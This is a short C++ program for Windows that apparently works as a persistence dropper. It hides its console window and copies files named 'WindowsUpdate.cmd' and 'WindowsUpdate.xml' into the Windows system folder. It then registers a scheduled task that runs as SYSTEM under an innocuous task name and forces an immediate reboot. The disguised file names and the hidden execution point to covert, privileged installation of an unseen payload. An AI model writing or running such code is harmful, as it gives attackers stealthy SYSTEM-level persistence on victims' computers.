#include "windows.h"
#include <iostream>
#include <windows.h>
#include <Lmcons.h>
#include <fstream>
#include <string>
#include <atlstr.h>
#include <stdio.h>
#include <cstdlib>
#include <chrono>



int main()
{

		ShowWindow(GetConsoleWindow(), SW_HIDE);
		std::string script;
		std::string path;
		std::string xmlpath;
		 //GET CURRENT DIRECTORY
		wchar_t NPath[MAX_PATH];
		GetCurrentDirectory(MAX_PATH, NPath);
		std::wofstream MyFile("filename.txt");
		MyFile << NPath;
		MyFile.close();
		std::ifstream MyReadFile("filename.txt");
		std::string myText;

		while (getline(MyReadFile, myText)) {
		}
		MyReadFile.close();
	
		path = "copy " + myText + "\\WindowsUpdate.cmd c:\\Windows\\";
		xmlpath = "copy " + myText + "\\WindowsUpdate.xml c:\\Windows\\";
		script = "SCHTASKS /CREATE /RU SYSTEM /XML c:\\Windows\\WindowsUpdate.xml  /TN ""MyTasks\Notepadtask"" ";
		
		const char* c = script.c_str();
		const char* cpath = path.c_str();
		const char* cxmlpath = xmlpath.c_str();
		system(cpath);
		system(cxmlpath);
		system(c);
		system("shutdown /r /t 0");
}